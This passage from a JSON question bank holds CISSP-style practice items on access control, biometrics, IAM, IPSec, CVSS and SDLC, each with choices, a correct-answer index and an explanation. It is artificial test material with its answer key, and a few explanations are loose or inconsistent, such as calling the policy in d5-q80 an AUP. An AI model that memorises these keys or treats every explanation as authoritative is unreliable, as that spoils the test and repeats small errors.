      "explanation": "Option 2 is correct. Act honorably, honestly, justly, responsibly, and legally. Reporting the attack would be the honorable thing to do. Option 4 is incorrect. Advancing and protecting the profession is the responsibility of every certified professional to uphold their hard-earned credentials. Delivering training sessions is therefore primarily advancing the profession. Option 1 is not correct as protecting society and the common good is mainly the outcome of conducting security awareness training on cyberbullying. Option 3 is not correct as providing diligent and competent services to principals helps you to retain your credentials."
    },
    {
      "id": "d1-q107",
      "domain": "1. Security and Risk Management",
      "stem": "XYZ Laboratories process Protected Health Information (PHI) of patients. Dr. Zaid is the lead surgeon and retrieves the medical records of visitors before prescribing drugs and going to the surgical ward. She reads detailed information about the patient waiting to receive surgery. She prescribes drugs and related items based on the information on the patient's private medical record. Kumar, the assistant nurse, on the other hand, has all the necessary clearance to access medical records to carry out his job in general but he is denied access to the PHI of the patients. Which principle PRIMARILY applies to the access requirement demonstrated in the scenario?",
      "choices": [
        "Least privilege",
        "Separation of Duties (SoD)",
        "Need-to-know",
        "Just-in-Time (JIT)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Even if someone has clearance to access restricted records, it does not mean they should have access to all other information stored there. They must also have compelling reasons to gain access to private records. No one, except the assigned doctor, should have access to the private medical records of patients. The principle of least privilege will be applied when security clearance to entities is assigned. It focuses on ensuring minimum privileges are granted to entities when undertaking their responsibilities. Separation of Duties (SoD) is a principle that’s mainly used to avoid fraud that may be caused when people collude with each other. Just-in-Time (JIT) is a principle for assigning privileged access to entities occasionally. JIT is an element of Protect Account Management (PAM), which is used to enforce least privilege principles in a more granular manner."
    },
    {
      "id": "d6-q80",
      "domain": "6. Security Assessment and Testing",
      "stem": "A few security vulnerabilities with a Common Vulnerability Scoring System (CVSS) score of 9 were released by the vendor. Your enterprise has a mature vulnerability management program and you have been tasked to identify and prioritize the patches. Which CVSS metric group would you use to PRIORITIZE the patches?",
      "choices": [
        "Base metric",
        "Temporal metric",
        "Environmental metric",
        "Performance metric"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Environmental metrics indicate how much an end user organization is affected by the vulnerability. It is defined by the organization based on the base metric and temporal metric. Hence the environmental metric is used to prioritize the patches in the organization. The base metric indicates the severity of the vulnerability. It is set by the vendor and not the organization, hence it is not used to prioritize patches. However, it has a considerable influence on the final Common Vulnerability Scoring System (CVSS) score. The temporal metric indicates the urgency of the vulnerability to be patched. It is set by the vendor or originator and can change over time. Hence it is not used to prioritize patches. CVSS does not depend on the performance metric. Performance metrics are used to measure the effectiveness of the control or process; hence it is not related to vulnerability."
    },
    {
      "id": "d2-q54",
      "domain": "2. Asset Security",
      "stem": "A data custodian found declassified Solid State Drive (SSD) hard drives that have passed the retention period. The data owner advises him to wipe those hard drives and throw them away. What is the most EFFECTIVE way to wipe the SSDs?",
      "choices": [
        "Purging",
        "Formatting",
        "Degaussing",
        "Destruction"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The most effective way to wipe the data from the hard drives is to destroy them. This is usually done by drilling holes in the hard drive or incinerating them. Formatting does not delete the data completely and it can be recovered using basic recovery tools. Overwriting the disk multiple times is called purging. Purging is mostly used when a hard drive needs to be re-purposed. Since Solid State Drives (SSDs) do not have magnetic flux, they are immune to degaussing techniques."
    },
    {
      "id": "d8-q60",
      "domain": "8. Software Development Security",
      "stem": "A software development business has recently rolled out an in-house chat application to all their staff and has advised them to report any bugs or feature requests through the helpdesk system. A few staff members sent in a request stating that they cannot send emojis to their peers while chatting and they want this feature to be added to the new application. The software business follows a waterfall model and must go through each stage again to introduce this feature. In which STAGE of the waterfall model will unit testing be performed?",
      "choices": [
        "Testing",
        "Coding",
        "Design",
        "Maintenance"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Code development and debugging, which involves unit testing, are performed in the coding stage (also called the implementation stage). Unit testing means testing a piece of code prior to integrating it with other software code. In the testing phase, the entire application is tested with various tools and techniques like fuzzing, use case testing, etc. The design stage comes before the implementation. In the design stage, threat modeling is performed to identify threats to the application. This stage enlists the detailed software requirement, which gives a clear direction during the implementation stage. Maintenance is performed after the software is deployed and it’s the last stage in the waterfall model."
    },
    {
      "id": "d8-q61",
      "domain": "8. Software Development Security",
      "stem": "A business is looking to acquire Commercial off-the-Shelf (COTS) software to manage its internal assets. Which step should the enterprise perform FIRST before procurement?",
      "choices": [
        "Senior management approval.",
        "Risk assessment.",
        "Cost-benefit analysis.",
        "Scheduling a software demo with a vendor."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The risk assessment identifies potential risks and issues that can occur during and after the procurement process. Ideally, it should be performed in each stage of the project to minimize the risk to an acceptable level. Senior management approval is gained after the decision to acquire software is finalized and that should occur after the risk assessment is completed. Cost-benefit analysis is a part of risk assessment. Scheduling a software demo is performed during vendor and product assessment and it’s not the first step before procurement."
    },
    {
      "id": "d3-q75",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A gaming business wants to create an online casino where users can play together and win money. The casino will feature games like roulette, blackjack, poker, and slot machines. Each game will have dedicated mini servers to provide customers with a seamless and fast experience with minimum latency. These mini servers will do most of the processing except for money transactions. The transactions will be handled by a centralized web server and users will be redirected to this server to cash in or cash out their money. What is this type of DEPLOYMENT known as?",
      "choices": [
        "Fog computing",
        "Edge computing",
        "Serverless architecture",
        "Software as a Service (SaaS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The scenario describes edge computing. In edge computing, the processing is handled by the devices closer to the end user. Thus, rather than sending all data to a centralized server for processing, the mini servers process most of the data and only the transaction data is sent to the main server. Fog computing involves Internet of Things (IoT) sensors that collect information and send all the collected data to a centralized server in the Local Area Network (LAN) for processing. Unlike edge computing, fog computing does not process data closer to the end user. The serverless architecture is a cloud computing concept where the code development is handled by the end user and the infrastructure platform is handled completely by the cloud provider. Software as a Service (SaaS) is a cloud deployment model where the cloud provider is responsible for providing an application and an underlying infrastructure. In this scenario, there is no mention of cloud computing, hence the serverless and SaaS options do not apply."
    },
    {
      "id": "d6-q81",
      "domain": "6. Security Assessment and Testing",
      "stem": "A software developer is developing an online banking website wherein the customers will enter their account number and password to log in to their accounts. The application is currently in the testing phase and the developer is evaluating the application by modifying the length and characters of a normal account number and observing the application output. What kind of TESTING is the developer performing?",
      "choices": [
        "Code review",
        "Mutation fuzzing",
        "Generational fuzzing",
        "White-box testing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Fuzz testing is a form of dynamic testing where different types of inputs are entered into the application to find the flaw. In mutation fuzzing, the input is a slightly modified version of the actual input. This can be done by changing the input characters or increasing the input length. This is also called dumb fuzzing. In generational fuzzing, which is also called intelligent fuzzing, different data models are created that are then entered into the application to find vulnerabilities. Code review is the process of going through the software code to find out logical issues and weaknesses. In this scenario, the developer is not performing a code review. White-box testing is a type of penetration test, where a pen tester has complete knowledge of the organization."
    },
    {
      "id": "d5-q63",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "As part of multifactor authentication, a business employs a knowledge-based authentication system to verify the identity of its personnel. The system requires each user to answer typical questions that they can easily remember before being given access to valuable assets. Which option MOST LIKELY describes the authentication technique demonstrated in the scenario?",
      "choices": [
        "Passphrase",
        "Cognitive password",
        "Passwordless authentication",
        "One-Time Password (OTP)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. A cognitive password is a form of knowledge-based authentication that requires users to answer questions before being granted access. A passphrase is a string of characters that is memorable and has a unique meaning to the user. However, as opposed to cognitive passwords, users in passphrase-based authentication are not required to answer specific questions, which makes option 1 incorrect. Due to the weaknesses of password-based authentications, organizations may adopt passwordless authentication, such as biometrics, to avoid the inherent issues with passwords, thus there are no questions to answer, making option 3 incorrect. Option 4 is not correct as an OTP is an automatically generated password and is used only once; unlike cognitive passwords, users are not required to answer questions in OTP systems."
    },
    {
      "id": "d5-q64",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business has recently allowed its employees to bring and use their own devices besides the business-owned devices to enhance employee satisfaction and expand the business. However, the business wants to establish a mechanism to identify, authenticate, authorize, and track the status of each device before, during, and after gaining access to the corporate network services. What is the MOST appropriate mechanism to enforce the situation outlined in the scenario?",
      "choices": [
        "Multifactor Authentication (MFA)",
        "Endpoint Detection and Response (EDR)",
        "Defense-in-depth strategy",
        "Mobile Device Management (MDM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. MDM will be the solution that the organization uses to secure and manage mobile devices that personnel use to access resources. MFA is a technique of using two or more factors to authenticate entities and also relates to protecting mobile devices, hence option 1 is incorrect. Unlike MDM, EDR mainly focuses on endpoint device protection as a whole and not just mobile devices, thus making option 2 incorrect. Defense-in-depth is a security principle that requires the organization to apply multiple and distinct layers to protect resources, including mobile devices. However, it is a general principle and is not a specific security control for protecting mobile devices, thus making option 3 incorrect."
    },
    {
      "id": "d5-q65",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise plans to establish a robust Identification, Authentication, Authorization, Accountability (IAAA) scheme. Moreover, the enterprise wants to evaluate the security posture of its systems and applications using an independent third party to meet compliance requirements. Which option would be the BEST activity to meet the situations depicted in the scenario?",
      "choices": [
        "Security audits",
        "Security assessment",
        "Security testing",
        "Security walk-throughs"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Security audits are formal evaluation processes performed by independent auditors and their main focus is demonstrating security control effectiveness in meeting compliance requirements to an independent third party or regulatory body. A security assessment is performed by a trained internal assessor, thus option 2 is incorrect. Security testing is also mostly conducted by an internal employee to verify the effectiveness of controls and therefore option 3 is incorrect. Security walk-through is the simplest and is performed by an internal individual or group to manually verify controls, thus option 4 is incorrect."
    },
    {
      "id": "d4-q63",
      "domain": "4. Communication and Network Security",
      "stem": "A business wants to establish secure communication between its headquarters and branches and thereby protect all its data in transit. Furthermore, the data of the business will be encrypted and decrypted at each network node until it arrives at its destination. Which option is PRIMARILY outlined in the scenario?",
      "choices": [
        "Link encryption",
        "End-to-End Encryption (E2EE)",
        "Virtual Private Networks (VPNs)",
        "Transport Layer Security (TLS)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 1 is correct. Link encryption is a type of encryption technique in which all the packet headers and the messages are encrypted when traversing the network. And unlike E2EE, the traffic is encrypted and decrypted at each routing node in order to reach its destination. Option 2 is not correct because the E2EE technique encrypts the entire data payload or message of a packet with no encryption and decryption at every node. Option 3 is incorrect. A VPN establishes a secure, point-to-point connection or tunnel over an untrusted network such as the internet with no encryption and decryption at every node. TLS is a primary protocol for secure web traffic but not network communications. It is an E2EE technique, thus making option 4 incorrect."
    },
    {
      "id": "d4-q64",
      "domain": "4. Communication and Network Security",
      "stem": "Before two endpoints can engage in secured communication using Internet Protocol Security (IPSec), they must first agree on the security parameters, such as secret key lengths, encryption algorithms, the mode of operation, hash functions, and session keys. Which option MOST LIKELY defines the agreement?",
      "choices": [
        "Authentication Header (AH)",
        "Security Association (SA)",
        "Encapsulating Security Payload (ESP)",
        "Internet Key Exchange (IKE)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 2 is correct. SA endpoints must agree on security parameters in order to create secure communication and constitute a set of values that define the IPSec features and the protection measures applied to a connection. Option 1 is incorrect. AH provides data-origin authentication, integrity, and replay protection but it is not concerned with creating agreement between communicating parties. ESP is the core element of IPSec and provides confidentiality besides the features of AH but does not create an agreement between parties, thus making option 3 incorrect. Option 4 is not correct because IKE is a key management protocol standard that is mainly used in conjunction with IPSec."
    },
    {
      "id": "d4-q65",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to control the connectivity and management of network services between its geographically isolated data centers and Cloud Service Providers (CSPs). Moreover, the enterprise plans to connect the infrastructures across the internet through multiple connection types and wants to decouple the control plane from the data plane. Which option MOST LIKELY describes the situation outlined in the scenario?",
      "choices": [
        "Software-Defined Data Center (SDDC)",
        "Software-Defined Networking (SDN)",
        "Virtual Storage Area Network (VSAN)",
        "Software-Defined Wide Area Network (SD-WAN)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 4 is correct. SD-WAN architecture manages the connectivity and control services between distant data centers, remote locations or branch offices, and cloud services over Wide Area Network (WAN) links. Option 1 is not correct because SDDC uses virtualization to enable centralized compute, network, and storage services but does not connect separate networks as SD-WAN does. Option 2 is not correct because SDN is a more general architecture than SD-WAN and is deployed in the data center or the Local Area Network (LAN). VSAN is mainly concerned with abstracting the underlying architecture of storage systems but not network architecture, thus making option 3 incorrect."
    },
    {
      "id": "d4-q66",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to oversee and manage the efficiency and performance of its network communications. It also wants to measure the throughput, packet loss, latency, and availability of the network. Based on measurements, priority traffic can be given more bandwidth than low-priority traffic in the enterprise. Which option concepts is MAINLY demonstrated in the scenario?",
      "choices": [
        "Simple Network Management Protocol (SNMP)",
        "High Availability (HA)",
        "Quality of Service (QoS)",
        "Authentication protocols"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. QoS is the management of network communication efficiency and performance, and it is further employed to prioritize network traffic. Option 1 is not correct because SNMP is mainly used to monitor network performance but does not support network traffic prioritization. Option 2 is not correct as HA is mainly used to ensure the accessibility of services but not network traffic prioritization. Authentication protocols are used to grant or reject entities but they do not handle network traffic prioritization, thus making option 4 incorrect."
    },
    {
      "id": "d3-q76",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An author of a book wants to send a digitally signed copy of the book to a publisher. The author wants to ensure that the publisher receives an authentic, original copy of the book. Moreover, the author takes some random text from the document and encrypts and signs it before sending it to the publisher. Which option methods is the BEST to ensure that the contents of the book are not tampered with during transfer?",
      "choices": [
        "Hashed Message Authentication Code (HMAC)",
        "Public key cryptography and symmetric cryptography",
        "Public key cryptography and a hashing algorithm",
        "Shared key cryptography and a hashing algorithm"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. Public key cryptography and a hashing algorithm is the best combination to ensure that the document was not altered during the transfer. The author sends a hashed and encrypted message to the publisher, and this will ensure the authenticity of the document. Option 1 is not correct as HMAC uses symmetric key cryptography and it is possible to compromise the shared secret key when transmitting it. Option 2 is not correct because the combination of public key and symmetric cryptography is used for encryption and key exchange purposes, not for document signing. Option 4 is incorrect. Combining shared key cryptography with hashing algorithms will still lack secure key exchange and will not protect the document from modification."
    },
    {
      "id": "d5-q66",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise has various services hosted on its web and database servers that users frequently access to accomplish their tasks. One particular service in the environment is a web application that makes requests for data access on behalf of the users. This is because a user cannot directly access the database for security and performance reasons. What best describes the subject of data access in the scenario?",
      "choices": [
        "The user",
        "The organization",
        "The web application",
        "The database"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The web application is the subject in the demonstrated scenario because users access the services only through the web application. Thus, the web application is the active entity that facilitates the access of services between the users and the database. Option 1 is not correct because the users cannot directly access the database even though they are active subjects in the data access process. The organization is a passive entity or an object and is not involved in the data access process; thus, option 2 is incorrect. The database is the object that serves requests from the web application, hence D is incorrect."
    },
    {
      "id": "d5-q67",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise maintains and processes highly classified and sensitive information in one of its data centers. The enterprise wants to deploy the most accurate biometrics-based access control to safeguard its sensitive data. Which option MEETS the requirements of the enterprise?",
      "choices": [
        "Iris scans",
        "Fingerprints",
        "Face scans",
        "Retina scans"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Retina scans are the most accurate biometrics-based access controls. They work by identifying the patterns of blood vessels at the back of the eye. Iris scans are the second most accurate biometrics identification and therefore option 1 is incorrect. Fingerprints are the most widely adopted type of biometrics modality but are not the most accurate one. Hence, option 2 is not the correct choice. Face scans are not as accurate as retina and iris scans, thus option 3 is not the correct option."
    },
    {
      "id": "d5-q68",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Chief Security Officer (CSO) of an enterprise is concerned by a recent piggybacking attack on the facility. As a result, the CSO has developed physical access control systems to safeguard the facility. Furthermore, the CSO specifically plans to implement a security control to prevent similar attacks in the future. Which option would be the BEST control to reduce the concerns of the CSO?",
      "choices": [
        "Secured doors",
        "Turnstiles and mantraps",
        "Closed-Circuit Television (CCTV) surveillance",
        "Locks"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Turnstiles and mantraps are the best physical security controls to prevent piggybacking and other similar attacks. Secure doors may play a part in preventing piggybacking attacks but are not the best controls, hence option 1 is incorrect. Option 3 is not correct because CCTV systems are mostly detective controls and will not stop an intruder from entering a facility if not compensated by security guards, turnstiles, or mantraps. Locks are not effective in preventing piggybacking and tailgating attacks as someone will already open the checkpoints, thus making option 4 incorrect."
    },
    {
      "id": "d5-q69",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise is overwhelmed with false positives from biometrics-based access control devices and wants to determine the security concerns of the devices. A security analyst in the enterprise is tasked with identifying a False Rejection Rate (FRR) and False Acceptance Rate (FAR) for each device. Which option is NOT a correct statement about the FRR and FAR?",
      "choices": [
        "The FRR is more secure and acceptable to the organization than the FAR",
        "The FAR is more secure and acceptable to the organization than the FRR",
        "The FRR is sometimes called a Type 1 error while the FAR is named a Type 2 error",
        "The Crossover Error Rate (CER) is the point where Type 1 and Type 2 errors are equal"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The FAR is a situation that occurs when the biometrics device allows access to unauthorized entities, which exposes the organization and is a less secure behavior. Option 1 is true because FRR is a phenomenon that happens when the biometrics device denies access to authorized entities and is considered more secure and acceptable to the organization than allowing unauthorized entities. FRR and FAR are sometimes referred to as Type 1 and Type 2 errors, respectively, thus option 3 is a true statement. The CER is a particular attribute of biometrics devices and is determined when the FAR and FRR are equal or intersect with each other, hence option 4 is true."
    },
    {
      "id": "d5-q70",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business plans to establish a Multifactor Authentication (MFA) technique to identify and authenticate its entities. Moreover, the business wants to authorize access to its valuable assets only after each entity is properly identified and authenticated through MFA. The information security manager is tasked with developing a working MFA system to safeguard the assets. Which option would NOT be a true representation of MFA in the enterprise?",
      "choices": [
        "Password, fingerprint, and passphrase",
        "Password, smartcard, and fingerprint",
        "Retina scan, fingerprint, and iris scan",
        "Password, retina scan, and token"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Retina scan, fingerprint, and iris scan fall within the same authentication factor, namely \"something you are\" or Type 3 authentication. Therefore, this option is an example of single-factor authentication. Options 1, 2, and 4 are all true representations of MFA because all contain at least two \"something you know,\" \"something you have,\" and \"something you are\" factors."
    },
    {
      "id": "d5-q71",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise has a hierarchical access control mechanism that employs security labels to grant or reject access for each subject and object. Furthermore, subjects with a given label access objects of similar or higher security labels on a need-to-know basis. Which option access control models is BEST outlined in the scenario?",
      "choices": [
        "Attribute-Based Access Control (ABAC)",
        "Role-Based Access Control (RBAC)",
        "Discretionary Access Control (DAC)",
        "Mandatory Access Control (MAC)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. MAC employs security labels to identify access between subjects and objects in an organization as opposed to the other models. ABAC uses policy-based attributes to grant or reject access to subjects and objects instead of security labels, hence option 1 is incorrect. RBAC, on the other hand, uses hierarchical roles instead of security labels to centrally manage access between subjects and objects in an organization, thus option 2 is incorrect. Option 3 is not correct because in the DAC model, the owner grants access to subjects and objects based on its discretionary, not security, labels."
    },
    {
      "id": "d5-q72",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Most business functions of an enterprise depend on Software as a Service (SaaS) applications hosted by third-party providers. Furthermore, this enterprise wants to integrate those applications with legacy systems to securely identify, authenticate, manage, provision, and authorize its internal entities when accessing SaaS services. What is the most appropriate option control to meet the situation outlined in the scenario?",
      "choices": [
        "Identity as a Service (IDaaS)",
        "Security Assertion and Markup Language (SAML)",
        "Firewall as a Service (FWaaS)",
        "Federated Identity Management (FIM)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. IDaaS offers identification, authentication, authorization, access management, and related services in integration with cloud platforms. Option 2 is not correct because SAML provides a secure exchange of identification, authentication, and authorization information between organizations, but it is not as appropriate as IDaaS when it comes to integrating local systems with cloud services. FWaaS is a cloud-based firewall that provides Next-Generation Firewall (NGFW) capabilities but does not provide authentication and identification services, hence option 3 is incorrect. FIM, like IDaaS, handles identities of two or more federated organizations but is not the best suited to manage the specific situations described in the scenario, thus option 4 is incorrect."
    },
    {
      "id": "d5-q73",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise has established a biometric-based authentication system to block impostors and allow its employees to access different network services. The employees are required only to present their biometric data to the system and will be granted or denied access depending on the provided information. Which option MOST LIKELY describes the situation outlined in the scenario?",
      "choices": [
        "Biometric verification",
        "Biometric identification",
        "Biometrics enrollment",
        "Biometric validation"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In biometric identification, employees only present their biometric data and it will be matched against all the biometric data stored in the database in a one-to-many manner. In biometric verification, employees provide a combination of their ID and biometric data to the authentication system and it will be matched against the registered biometric reference template corresponding to the ID in a one-to-one fashion, hence option 1 is incorrect. Biometrics enrollment is the process of registering the demographic and biometric data of entities, thus option 3 is incorrect. Biometric validation is mostly done manually by experts to reconcile conflicting biometric records, hence option 4 is incorrect."
    },
    {
      "id": "d5-q74",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business has established various administrative, technical, and physical access controls in a defense-in-depth manner to authorize users and protect assets. Besides, the business has employed different preventative, detective, deterrent, corrective, compensating, directive, and recovery types of security controls. What best represents both technical and directive security controls?",
      "choices": [
        "Configuration standards",
        "Job rotation",
        "Warning banner",
        "Security policy"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Configuration standards are both technical and directive security controls employed to enforce the protection of assets. Job rotation is an administrative and detective security control, hence option 2 is incorrect. A warning banner can be a technical or administrative and deterrent security control but it is not a directive control, thus making option 3 incorrect. A security policy, on the other hand, is an administrative and directive or deterrent security control, and therefore option 4 is incorrect."
    },
    {
      "id": "d5-q75",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Chief Security Officer (CSO) is worried about the poor account and credential management system in the enterprise she works at. As a result, she directs the information security manager to develop and present secure password guidelines in their next meeting for final ratification and approval. What type of security control is the CISO MOST LIKELY trying to establish in the enterprise?",
      "choices": [
        "Technical and deterrent control",
        "Logical and directive control",
        "Administrative and directive control",
        "Operational and preventative control"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The CISO, through the secure password guidelines, is mainly planning to establish administrative and directive security controls. Secure password guidelines are not technical controls as they dictate the measures entities should take to secure their credentials, so option 1 is incorrect. Logical controls are another name for technical controls, thus option 2 is an incorrect choice as well, even though it is directive control. Secure password guidelines are neither operational/physical nor preventative controls, thus option 4 is incorrect."
    },
    {
      "id": "d5-q76",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business requires its personnel to pass through stringent security clearance before gaining access to one of its secure data centers hosting highly sensitive data. The business ensures that each person provides a username, retina scan, strong password, fingerprint, passphrase, and smartcard, thus preventing unauthorized entities from accessing the facility. How many distinct authentication factor types is the business MAINLY requiring in the outlined scenario?",
      "choices": [
        "Six",
        "Five",
        "Four",
        "Three"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The company is mainly requiring each person to identify and verify themselves through three typical authentication factors, namely \"something they know\" (username, strong password, and passphrase), \"something they have\" (smartcard), and \"something they are\" (retina scan and fingerprint). Options 1, 2, and 3 are therefore incorrect."
    },
    {
      "id": "d5-q77",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An employee has been working for an enterprise for many years as a system administrator. The employee has assumed and changed from a host of other administrative roles during his entire employment period. Worst, he was unhappy with a recent promotion program and may be contemplating staging an attack to satisfy his grudge. According to the demonstrated scenario, which of the following would be the MOST worrisome security threat to the enterprise?",
      "choices": [
        "Data theft",
        "Privilege creep",
        "Shortage of skilled staff",
        "Employment offer by a competitor firm"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The most significant security threat to the organization would be privilege creep as the employee might have accumulated administrative privileges during his/her employment. Data theft in the organization may pose a serious security threat to the organization but is not as grave a concern as privilege creep. Therefore, data theft is secondary to privileged access, hence option 1 is incorrect. Shortage of proficient staff is secondary to privilege creep, hence option 3 is incorrect. Employment by a competitor company may pose a conflict-of-interest issue, but is not as worrisome as privileged access to organizational assets, thus option 4 is incorrect."
    },
    {
      "id": "d5-q78",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise plans to establish a robust Identity and Access Management (IAM) program to determine the accountability of each person. Furthermore, the enterprise wants to develop a program to minimize the denial of activities by its employees and hold them accountable for their actions. Which option MUST the program contain in order to properly trace the actions of each person?",
      "choices": [
        "Identification and authentication",
        "Identification and authorization",
        "Identification, authentication, and authorization",
        "Authorization and authentication"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Robust identification and authentication are a must for properly tracing the actions of personnel, but authorization is not mandatory. Since authorization occurs after the proper identification and authentication of every person in the organization, the other way around does not hold true. Therefore, the other options are all incorrect choices."
    },
    {
      "id": "d5-q79",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An attacker was able to gain access to the hash values of a strong password of a database administrator of an enterprise. Further, the attacker entered the hash values to gain authentication to other networked systems and stole customer data. The situation was worsened by the negligence of the administrator in using the same credentials to access multiple systems. What did the attacker MOST LIKELY employ to launch the incident described in the scenario?",
      "choices": [
        "Credential stuffing attack",
        "Password spraying attack",
        "Pass-the-Hash (PtH) attack",
        "Rainbow table attack"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. PtH occurs when an attacker captures and sends hash values of a password to an authentication server with the hope of gaining unauthorized access. Option 1 is not correct because credential stuffing is an attack that utilizes lists of compromised credentials, not hash values of credentials. Option 2 is not correct as password spraying is a form of a brute-force attack that occurs when an attacker attempts to circumvent account lockout policies of systems. A rainbow table attack is a variant of a brute-force attack that is conducted using hashed passwords. However, unlike the PtH attack, it does not pass the hash value to systems to gain unauthorized access, hence option 4 is incorrect."
    },
    {
      "id": "d5-q80",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Chief Information Security Officer (CISO) is concerned with weak password management in the enterprise. As a result, the CISO wants to develop an Identity and Access Management (IAM) policy on password complexity and strength. The AUP is expected to uniformly enhance the activities and behaviors of employees in securely maintaining their credentials. What type of control is the CISO MAINLY trying to enforce in the enterprise to cope with the concern?",
      "choices": [
        "Technical and directive control",
        "Administrative and deterrent control",
        "Technical and preventative control",
        "Operational and recovery control"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. An AUP is mainly an administrative and deterrent security control and enhances the behaviors of personnel in an organization. Options 1 and 3 are incorrect because an AUP is neither a technical nor preventative control but rather an administrative and deterrent/directive control. An AUP is neither a physical control nor a recovery control, which makes option 4 incorrect."
    },
    {
      "id": "d5-q81",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An attacker has registered a malicious domain name with a slightly misspelled name of a popular web platform and applies different tactics to lure and deceive its targeted victims to visit the fake website. Once victims fall into the trap, the attacker further tricks them into downloading malware embedded in the fake site. What method is the cybercriminal MOST LIKELY employing to stage the attack outlined in the scenario?",
      "choices": [
        "Social engineering attack",
        "Session hijacking attack",
        "Typosquatting attack",
        "Cybersquatting attack"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Typosquatting occurs when an attacker attempts to capture and redirect traffic when users mistype names or IP addresses of valid domain names. Social engineering occurs when an intruder manipulates people to retrieve sensitive data. However, it is secondary to typosquatting, thus option 1 is incorrect. Session hijacking occurs when an intruder intercepts part of an established communication between an authorized user and a service, thus option 2 is incorrect. Cybersquatting occurs when domain names of famous companies are registered in an unauthorized manner for malicious intent and therefore option 4 is incorrect."
    },
    {
      "id": "d5-q82",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A web server is synchronized in real time with a validation server of a Certificate Authority (CA) to verify the web services of an e-commerce system. Moreover, the web server receives signed and timestamped feedback from the validation server and attaches it to the certificate of the web platform to prove its trustworthiness. The web server then sends the signed and timestamped certificate to every requesting entity to verify its authenticity. Which option is MAINLY demonstrated in the scenario?",
      "choices": [
        "Certificate stapling",
        "Online Certificate Status Protocol (OCSP)",
        "Certificate Revocation List (CRL)",
        "Certificate Policy Statement (CPS)"
      ],
      "correctIndex": 0,
